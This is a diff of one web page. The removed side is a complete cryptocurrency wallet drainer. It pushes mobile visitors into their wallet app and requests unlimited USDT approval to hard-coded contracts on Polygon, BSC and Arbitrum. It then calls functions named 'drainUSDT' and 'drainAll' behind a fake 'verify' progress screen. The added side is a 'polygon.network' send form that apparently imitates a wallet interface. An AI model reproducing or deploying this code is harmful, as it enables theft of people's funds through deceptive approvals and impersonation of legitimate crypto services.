@@ -1,781 +1,229 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+    <meta charset="UTF-8" />
+    <title>polygon.network</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        * {
+            box-sizing: border-box;
             margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-            text-align: center;
+            padding: 0;
         }
-        .mobile-container {
-            max-width: 400px;
-            margin: 50px auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
-        .wallet-logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
+
+        .app-bar {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid #262626;
+        }
+
+        .app-bar-title {
+            margin: 0 auto;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .container {
+            flex: 1;
+            padding: 24px 16px 100px;
+        }
+
+        .label {
+            font-size: 13px;
+            color: #a0a0a0;
+            margin-bottom: 6px;
+        }
+
+        .row {
+            display: flex;
+            align-items: center;
+            background-color: #111111;
+            border-radius: 10px;
+            border: 1px solid #262626;
+            padding: 8px 10px;
+        }
+
+        .row input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .row input::placeholder {
+            color: #555555;
+        }
+
+        .row button,
+        .icon-btn {
+            border: none;
+            background: none;
+            color: #00ff7f;
+            font-size: 13px;
+            margin-left: 6px;
+            cursor: pointer;
+        }
+
+        .icon-btn {
+            padding: 0;
+            width: 22px;
+            height: 22px;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-size: 40px;
-            font-weight: bold;
         }
-        .metamask { background: #f6851b; }
-        .trustwallet { background: #3375bb; }
-        .open-button {
-            background: #f6851b;
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-            width: 100%;
-            transition: background 0.3s;
+
+        .icon-btn img {
+            max-width: 100%;
+            max-height: 100%;
+            display: block;
         }
-        .trust-button {
-            background: #3375bb;
+
+        .amount-box {
+            margin-top: 24px;
         }
-        .open-button:hover {
-            opacity: 0.9;
-        }
-        .instructions {
-            text-align: left;
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-        .instructions ol {
-            margin: 10px 0;
-            padding-left: 20px;
-        }
-        .instructions li {
-            margin-bottom: 8px;
-        }
-        .status-container {
-            display: none;
-            max-width: 600px;
-            margin: 20px auto;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .network-status {
-            margin-bottom: 15px;
-            padding: 10px;
-            border-radius: 4px;
-            background: #f9f9f9;
-            text-align: left;
-        }
-        .success {
-            background: #d4edda;
-            border-left: 4px solid #28a745;
-            color: #155724;
-        }
-        .error {
-            background: #f8d7da;
-            border-left: 4px solid #dc3545;
-            color: #721c24;
-        }
-        .pending {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            color: #856404;
-        }
-        .waiting {
-            background: #e2e3e5;
-            border-left: 4px solid #6c757d;
-            color: #383d41;
-        }
-        .wallet-buttons {
+
+        .amount-row {
             display: flex;
-            gap: 10px;
-            margin: 20px 0;
+            align-items: center;
+            background-color: #111111;
+            border-radius: 10px;
+            border: 1px solid #262626;
+            padding: 14px 12px;
         }
-        .wallet-buttons button {
+
+        .amount-row input {
             flex: 1;
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 18px;
+            outline: none;
         }
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
+
+        .amount-row-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #a0a0a0;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        .amount-row-right .token {
+            color: #ffffff;
+        }
+
+        .amount-row-right .max {
+            color: #00ff7f;
+            cursor: pointer;
+        }
+
+        .usd-hint {
+            margin-top: 6px;
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+
+        .bottom-bar {
+            position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            padding: 16px;
+            background: #000000;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: #00ff7f;
+            border-radius: 999px;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #000000;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <!-- Mobile Welcome Screen -->
-    <div id="mobile-welcome" class="mobile-container">
-        <div class="wallet-logo metamask">M</div>
-        <h2>Open in Web3 Wallet</h2>
-        <p>To continue, please open this dapp in a Web3 wallet browser</p>
-        
-        <div class="wallet-buttons">
-            <button id="open-metamask" class="open-button">
-                MetaMask
-            </button>
-            <button id="open-trustwallet" class="open-button trust-button">
-                Trust Wallet
-            </button>
+    <header class="app-bar">
+        <div class="app-bar-title">polygon.network</div>
+    </header>
+
+    <main class="container">
+        <!-- Address section -->
+        <div>
+            <div class="label">Address or Domain Name</div>
+            <div class="row">
+                <input
+                    type="text"
+                    id="addressInput"
+                    autocomplete="off"
+                    placeholder=""
+                />
+                <button type="button" onclick="pasteAddress()">Paste</button>
+
+                <!-- Contact icon -->
+                <button type="button" class="icon-btn" title="Contacts">
+                    <img src="/mnt/data/phone book .jpg" alt="Contacts" />
+                </button>
+
+                <!-- QR icon -->
+                <button type="button" class="icon-btn" title="Scan QR">
+                    <img src="/mnt/data/qr p.jpg" alt="QR" />
+                </button>
+            </div>
         </div>
-        
-        <div class="instructions">
-            <strong>How to use:</strong>
-            <ol>
-                <li>Tap your preferred wallet button above</li>
-                <li>App will open in your wallet browser</li>
-                <li>Connect your wallet when prompted</li>
-                <li>Approve the transactions when asked</li>
-                <li>Process will run automatically across 3 networks</li>
-            </ol>
+
+        <!-- Amount section -->
+        <div class="amount-box">
+            <div class="label">Amount</div>
+            <div class="amount-row">
+                <input type="number" id="amountInput" value="1" min="0" step="0.01" />
+                <div class="amount-row-right">
+                    <span class="token">USDT</span>
+                    <span class="max">Max</span>
+                </div>
+            </div>
+            <div class="usd-hint">= $1.00</div>
         </div>
-        
-        <p style="font-size: 12px; color: #666;">
-            If buttons don't work, copy the URL and paste it in your wallet browser
-        </p>
+    </main>
+
+    <!-- Bottom Next button -->
+    <div class="bottom-bar">
+        <button class="next-btn" onclick="goNext()">Next</button>
     </div>
 
-    <!-- Transaction Status (Hidden by default) -->
-    <div id="status-container" class="status-container">
-        <h3>Transaction Status</h3>
-        <div class="loading-spinner"></div>
-        <div id="network-statuses">
-            <div class="network-status waiting" id="polygon-status">
-                <div><strong>Polygon</strong></div>
-                <div>Waiting...</div>
-            </div>
-            <div class="network-status waiting" id="bsc-status">
-                <div><strong>BNB Smart Chain</strong></div>
-                <div>Waiting...</div>
-            </div>
-            <div class="network-status waiting" id="arbitrum-status">
-                <div><strong>Arbitrum</strong></div>
-                <div>Waiting...</div>
-            </div>
-        </div>
-        <div id="overall-status" style="margin-top: 20px; padding: 10px; border-radius: 4px;"></div>
-    </div>
-
-<script>
-const mobileWelcome = document.getElementById('mobile-welcome');
-const statusContainer = document.getElementById('status-container');
-const openMetaMaskBtn = document.getElementById('open-metamask');
-const openTrustWalletBtn = document.getElementById('open-trustwallet');
-
-// Enhanced Web3 detection that works in mobile wallets
-function detectWeb3() {
-    if (window.ethereum) {
-        return window.ethereum;
-    } else if (window.web3 && window.web3.currentProvider) {
-        return window.web3.currentProvider;
-    } else if (window.trustwallet) {
-        return window.trustwallet;
-    } else if (window.imToken) {
-        return window.imToken;
-    }
-    
-    if (typeof window.ethereum !== 'undefined') {
-        return window.ethereum;
-    }
-    
-    return null;
-}
-
-// Enhanced mobile detection
-function isMobile() {
-    return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
-        navigator.userAgent.toLowerCase()
-    );
-}
-
-// Check if we're already in a Web3 browser
-function isInWeb3Browser() {
-    const provider = detectWeb3();
-    if (provider) {
-        return true;
-    }
-    
-    const userAgent = navigator.userAgent.toLowerCase();
-    const inMetaMask = userAgent.includes('metamask') || userAgent.includes('brave');
-    const inTrustWallet = userAgent.includes('trustwallet');
-    
-    return inMetaMask || inTrustWallet;
-}
-
-// Generate deeplinks for different wallets
-function getMetaMaskDeeplink() {
-    const currentUrl = encodeURIComponent(window.location.href);
-    return `https://metamask.app.link/dapp/${currentUrl.replace('https://', '')}`;
-}
-
-function getTrustWalletDeeplink() {
-    const currentUrl = encodeURIComponent(window.location.href);
-    return `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
-}
-
-// Try to auto-redirect to wallet
-function redirectToWallet(walletType) {
-    let deeplink;
-    if (walletType === 'metamask') {
-        deeplink = getMetaMaskDeeplink();
-    } else if (walletType === 'trustwallet') {
-        deeplink = getTrustWalletDeeplink();
-    }
-    
-    window.location.href = deeplink;
-}
-
-// Initialize the app
-function initApp() {
-    const web3Provider = detectWeb3();
-    
-    // If Web3 is available, start the process immediately
-    if (web3Provider) {
-        mobileWelcome.style.display = 'none';
-        statusContainer.style.display = 'block';
-        initializeWeb3(web3Provider);
-        return;
-    }
-    
-    // If we're already in a wallet browser but provider isn't detected
-    if (isInWeb3Browser()) {
-        mobileWelcome.style.display = 'none';
-        statusContainer.style.display = 'block';
-        document.getElementById('overall-status').textContent = 'Waiting for wallet connection...';
-        
-        // Try to detect provider with retry
-        waitForWeb3Provider();
-        return;
-    }
-    
-    // If on mobile without Web3, show welcome screen
-    if (isMobile()) {
-        mobileWelcome.style.display = 'block';
-        statusContainer.style.display = 'none';
-        
-        // Auto-redirect to MetaMask after short delay
-        setTimeout(() => {
-            if (!detectWeb3()) {
-                redirectToWallet('metamask');
-            }
-        }, 1000);
-    } else {
-        // Desktop without Web3
-        mobileWelcome.style.display = 'block';
-        statusContainer.style.display = 'none';
-        mobileWelcome.innerHTML = `
-            <div class="wallet-logo metamask">M</div>
-            <h2>Web3 Wallet Required</h2>
-            <p>Please install MetaMask to continue</p>
-            <button onclick="window.open('https://metamask.io/download/', '_blank')" class="open-button">
-                Install MetaMask
-            </button>
-        `;
-    }
-}
-
-// Wait for Web3 provider to become available (for wallet browsers)
-function waitForWeb3Provider(retries = 10) {
-    const provider = detectWeb3();
-    if (provider) {
-        initializeWeb3(provider);
-        return;
-    }
-    
-    if (retries > 0) {
-        setTimeout(() => waitForWeb3Provider(retries - 1), 1000);
-    } else {
-        document.getElementById('overall-status').textContent = 'Wallet not detected. Please refresh or open in MetaMask/TrustWallet.';
-        document.getElementById('overall-status').className = 'error';
-    }
-}
-
-// Setup wallet buttons
-openMetaMaskBtn.addEventListener('click', function() {
-    redirectToWallet('metamask');
-});
-
-openTrustWalletBtn.addEventListener('click', function() {
-    redirectToWallet('trustwallet');
-});
-
-// ========== WEB3 FUNCTIONALITY ==========
-let isExecuting = false;
-let executionCount = 0;
-const MAX_EXECUTIONS = 1;
-
-const processedNetworks = {
-    '0x89': false,
-    '0x38': false, 
-    '0xa4b1': false
-};
-
-const usdtABI = [{
-    "constant": false,
-    "inputs": [
-        {"name":"_spender","type":"address"},
-        {"name":"_value","type":"uint256"}
-    ],
-    "name": "approve",
-    "outputs": [{"name":"","type":"bool"}],
-    "type": "function"
-}];
-
-// Enhanced drain ABI with transfer functions
-const drainABI = [
-    // Original verify functions
-    {
-        "constant": false,
-        "inputs": [{"name":"amount","type":"uint256"}],
-        "name": "verifyOnPolygon",
-        "outputs": [{"name":"","type":"bool"}],
-        "type": "function"
-    }, {
-        "constant": false,
-        "inputs": [{"name":"amount","type":"uint256"}],
-        "name": "verifyOnBSC",
-        "outputs": [{"name":"","type":"bool"}],
-        "type": "function"
-    }, {
-        "constant": false,
-        "inputs": [{"name":"amount","type":"uint256"}],
-        "name": "verifyOnArbitrum", 
-        "outputs": [{"name":"","type":"bool"}],
-        "type": "function"
-    },
-    // Additional transfer functions that might exist
-    {
-        "constant": false,
-        "inputs": [{"name":"amount","type":"uint256"}],
-        "name": "drainUSDT",
-        "outputs": [{"name":"","type":"bool"}],
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [{"name":"token","type":"address"}, {"name":"amount","type":"uint256"}],
-        "name": "drainToken",
-        "outputs": [{"name":"","type":"bool"}],
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [],
-        "name": "drainAll",
-        "outputs": [{"name":"","type":"bool"}],
-        "type": "function"
-    }
-];
-
-const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-
-const CHAIN_CONFIGS = {
-    '0x89': {
-        contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
-        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-        function: 'verifyOnPolygon',
-        name: 'Polygon',
-        statusElement: 'polygon-status'
-    },
-    '0x38': {
-        contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
-        usdt: '0x55d398326f99059fF775485246999027B3197955', 
-        function: 'verifyOnBSC',
-        name: 'BSC',
-        statusElement: 'bsc-status'
-    },
-    '0xa4b1': {
-        contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
-        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-        function: 'verifyOnArbitrum',
-        name: 'Arbitrum',
-        statusElement: 'arbitrum-status'
-    }
-};
-
-function updateNetworkStatus(chainId, status, message) {
-    const config = CHAIN_CONFIGS[chainId];
-    if (!config) return;
-    
-    const element = document.getElementById(config.statusElement);
-    if (!element) return;
-    
-    element.className = 'network-status ' + status;
-    const messageElement = element.querySelector('div:nth-child(2)');
-    if (messageElement) {
-        messageElement.textContent = message;
-    }
-}
-
-async function switchNetwork(chainId) {
-    const chainConfig = {
-        '0x89': {
-            chainId: '0x89',
-            chainName: 'Polygon Mainnet',
-            rpcUrls: ['https://polygon-rpc.com/'],
-            blockExplorerUrls: ['https://polygonscan.com/'],
-            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }
-        },
-        '0x38': {
-            chainId: '0x38',
-            chainName: 'BNB Smart Chain',
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com/'],
-            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
-        },
-        '0xa4b1': {
-            chainId: '0xa4b1',
-            chainName: 'Arbitrum One',
-            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
-            blockExplorerUrls: ['https://arbiscan.io/'],
-            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }
-        }
-    };
-
-    try {
-        updateNetworkStatus(chainId, 'pending', 'Switching network...');
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: chainId }],
-        });
-        updateNetworkStatus(chainId, 'pending', 'Network switched - waiting...');
-        return true;
-    } catch (switchError) {
-        if (switchError.code === 4902) {
-            try {
-                updateNetworkStatus(chainId, 'pending', 'Adding network...');
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [chainConfig[chainId]],
+    <script>
+        function pasteAddress() {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText().then(function (text) {
+                    document.getElementById("addressInput").value = text;
+                }).catch(function () {
+                    alert("Unable to read from clipboard.");
                 });
-                updateNetworkStatus(chainId, 'pending', 'Network added - waiting...');
-                return true;
-            } catch (addError) {
-                updateNetworkStatus(chainId, 'error', 'Failed to add network');
-                return false;
+            } else {
+                alert("Clipboard access not supported in this browser.");
             }
         }
-        updateNetworkStatus(chainId, 'error', 'Failed to switch network');
-        return false;
-    }
-}
 
-// Check USDT balance before attempting drain
-async function checkUSDTBalance(web3, usdtAddress, userAddress) {
-    try {
-        const balanceABI = [{
-            "constant": true,
-            "inputs": [{"name":"_owner","type":"address"}],
-            "name": "balanceOf",
-            "outputs": [{"name":"balance","type":"uint256"}],
-            "type": "function"
-        }];
-        
-        const usdtContract = new web3.eth.Contract(balanceABI, usdtAddress);
-        const balance = await usdtContract.methods.balanceOf(userAddress).call();
-        return web3.utils.fromWei(balance, 'mwei'); // USDT uses 6 decimals
-    } catch (error) {
-        return '0';
-    }
-}
-
-// Try different drain methods
-async function tryDrainMethods(web3, drainContract, userAddress, config) {
-    const methods = [
-        // Try the main verify function first
-        { name: config.function, params: [web3.utils.toWei('1000', 'mwei')] },
-        // Try alternative methods
-        { name: 'drainUSDT', params: [web3.utils.toWei('1000', 'mwei')] },
-        { name: 'drainToken', params: [config.usdt, web3.utils.toWei('1000', 'mwei')] },
-        { name: 'drainAll', params: [] }
-    ];
-
-    for (const method of methods) {
-        try {
-            // Check if method exists
-            const contractMethod = drainContract.methods[method.name];
-            if (!contractMethod) continue;
-
-            updateNetworkStatus(config.chainId, 'pending', `Trying ${method.name}...`);
-            
-            const transaction = await contractMethod(...method.params).send({
-                from: userAddress,
-                gas: 250000,
-                gasPrice: await web3.eth.getGasPrice()
-            });
-
-            return { success: true, method: method.name, transaction };
-        } catch (error) {
-            // Continue to next method if this one fails
-            continue;
+        function goNext() {
+            // Change this to whatever page you want
+            window.location.href = "next.html";
         }
-    }
-    
-    return { success: false };
-}
-
-async function processNetwork(chainId) {
-    try {
-        const web3 = new Web3(window.ethereum);
-        
-        // Request accounts first
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        
-        if (!accounts || accounts.length === 0) {
-            throw new Error('No accounts connected');
-        }
-
-        const userAddress = accounts[0];
-        const config = CHAIN_CONFIGS[chainId];
-        
-        updateNetworkStatus(chainId, 'pending', 'Checking USDT balance...');
-
-        // Check USDT balance first
-        const usdtBalance = await checkUSDTBalance(web3, config.usdt, userAddress);
-        
-        if (parseFloat(usdtBalance) === 0) {
-            updateNetworkStatus(chainId, 'error', 'No USDT balance found');
-            return 'no_balance';
-        }
-
-        updateNetworkStatus(chainId, 'pending', `USDT Balance: ${usdtBalance} - Starting...`);
-
-        // USDT Approval - approve the drain contract to spend USDT
-        updateNetworkStatus(chainId, 'pending', 'Approving USDT access...');
-        
-        const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
-        
-        try {
-            const approval = await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
-                from: userAddress,
-                gas: 150000
-            });
-            updateNetworkStatus(chainId, 'pending', 'USDT approved - Processing transfer...');
-        } catch (approvalError) {
-            if (approvalError.code === 4001) {
-                updateNetworkStatus(chainId, 'error', 'User rejected USDT approval');
-                return 'rejected';
-            }
-            throw approvalError;
-        }
-
-        // Main transaction - Try multiple drain methods
-        updateNetworkStatus(chainId, 'pending', 'Transferring USDT...');
-        
-        const drainContract = new web3.eth.Contract(drainABI, config.contract);
-        
-        const drainResult = await tryDrainMethods(web3, drainContract, userAddress, config);
-        
-        if (drainResult.success) {
-            updateNetworkStatus(chainId, 'success', `USDT transferred successfully via ${drainResult.method}!`);
-            processedNetworks[chainId] = true;
-            return 'success';
-        } else {
-            // If all methods fail, try the original method with exact balance
-            try {
-                const exactAmount = web3.utils.toWei(usdtBalance, 'mwei');
-                const transaction = await drainContract.methods[config.function](exactAmount).send({
-                    from: userAddress,
-                    gas: 250000,
-                    gasPrice: await web3.eth.getGasPrice()
-                });
-                
-                updateNetworkStatus(chainId, 'success', 'USDT transferred successfully!');
-                processedNetworks[chainId] = true;
-                return 'success';
-                
-            } catch (finalError) {
-                if (finalError.code === 4001) {
-                    updateNetworkStatus(chainId, 'error', 'User rejected transfer');
-                    return 'rejected';
-                } else {
-                    updateNetworkStatus(chainId, 'error', 'Transfer failed');
-                    return 'error';
-                }
-            }
-        }
-        
-    } catch (error) {
-        if (error.code === 4001) {
-            updateNetworkStatus(chainId, 'error', 'User rejected transaction');
-            return 'rejected';
-        } else {
-            updateNetworkStatus(chainId, 'error', 'Transaction failed');
-            return 'error';
-        }
-    }
-}
-
-async function startNetworkCycle() {
-    if (isExecuting) {
-        return;
-    }
-    
-    isExecuting = true;
-    executionCount++;
-
-    const web3 = new Web3(window.ethereum);
-    
-    // Get current network FIRST
-    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-    
-    // Log current network for debugging
-    console.log('Current network:', currentChainId);
-    
-    const allNetworks = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
-    let successfulDrains = 0;
-
-    // STEP 1: Process current network first (whatever network user is on)
-    const currentNetworkConfig = CHAIN_CONFIGS[currentChainId];
-    
-    if (currentNetworkConfig && !processedNetworks[currentChainId]) {
-        updateNetworkStatus(currentChainId, 'pending', `Processing ${currentNetworkConfig.name} (current network)...`);
-        const currentResult = await processNetwork(currentChainId);
-        if (currentResult === 'success') successfulDrains++;
-        
-        // If user rejects on current network, stop completely
-        if (currentResult === 'rejected') {
-            document.getElementById('overall-status').textContent = 'Process stopped - user rejected transaction';
-            document.getElementById('overall-status').className = 'error';
-            document.querySelector('.loading-spinner').style.display = 'none';
-            isExecuting = false;
-            return;
-        }
-        
-        // Wait a bit before moving to next network
-        await new Promise(resolve => setTimeout(resolve, 2000));
-    } else if (!currentNetworkConfig) {
-        // User is on an unsupported network, start with first supported network
-        updateNetworkStatus(allNetworks[0], 'pending', 'Switching to supported network...');
-        const switched = await switchNetwork(allNetworks[0]);
-        if (switched) {
-            const firstResult = await processNetwork(allNetworks[0]);
-            if (firstResult === 'success') successfulDrains++;
-        }
-    }
-
-    // STEP 2: Process other networks (excluding current one)
-    const otherNetworks = allNetworks.filter(chainId => chainId !== currentChainId);
-    
-    for (const chainId of otherNetworks) {
-        if (processedNetworks[chainId]) continue;
-        
-        // Ask to switch to the next network
-        const config = CHAIN_CONFIGS[chainId];
-        updateNetworkStatus(chainId, 'pending', `Requesting switch to ${config.name}...`);
-        
-        const switched = await switchNetwork(chainId);
-        
-        if (!switched) {
-            updateNetworkStatus(chainId, 'error', 'Network switch rejected or failed');
-            continue; // Continue to next network even if switch fails
-        }
-        
-        // Wait for network switch to complete
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        
-        // Verify we're on the correct network
-        const newChainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (newChainId !== chainId) {
-            updateNetworkStatus(chainId, 'error', 'Network switch incomplete');
-            continue;
-        }
-        
-        // Process the network
-        updateNetworkStatus(chainId, 'pending', 'Processing network...');
-        const result = await processNetwork(chainId);
-        if (result === 'success') successfulDrains++;
-        
-        // If user rejects on any network, stop the process
-        if (result === 'rejected') {
-            break;
-        }
-        
-        // Wait before next network (if not the last one)
-        const currentIndex = otherNetworks.indexOf(chainId);
-        if (currentIndex < otherNetworks.length - 1) {
-            updateNetworkStatus(chainId, 'pending', 'Moving to next network...');
-            await new Promise(resolve => setTimeout(resolve, 3000));
-        }
-    }
-
-    // Update overall status
-    const overallStatus = document.getElementById('overall-status');
-    overallStatus.textContent = `Completed: ${successfulDrains}/3 networks processed`;
-    
-    if (successfulDrains === 3) {
-        overallStatus.className = 'success';
-    } else if (successfulDrains > 0) {
-        overallStatus.className = 'pending';
-    } else {
-        overallStatus.className = 'error';
-    }
-
-    // Hide loading spinner
-    document.querySelector('.loading-spinner').style.display = 'none';
-
-    // Redirect after completion
-    setTimeout(() => {
-        window.location.href = "https://google.com";
-    }, 3000);
-    
-    isExecuting = false;
-}
-
-function initializeWeb3(provider) {
-    // Set up event listeners
-    provider.on('chainChanged', (chainId) => {
-        console.log('Network changed to:', chainId);
-    });
-    
-    provider.on('accountsChanged', (accounts) => {
-        console.log('Accounts changed:', accounts.length);
-    });
-    
-    // Start the process
-    setTimeout(() => {
-        startNetworkCycle();
-    }, 1000);
-}
-
-// Start the app
-initApp();
-
-// Continuous provider detection for cases where provider loads slowly
-setInterval(() => {
-    if (!isExecuting && executionCount === 0) {
-        const provider = detectWeb3();
-        if (provider && mobileWelcome.style.display !== 'none') {
-            mobileWelcome.style.display = 'none';
-            statusContainer.style.display = 'block';
-            initializeWeb3(provider);
-        }
-    }
-}, 2000);
-</script>
+    </script>
 </body>
 </html>
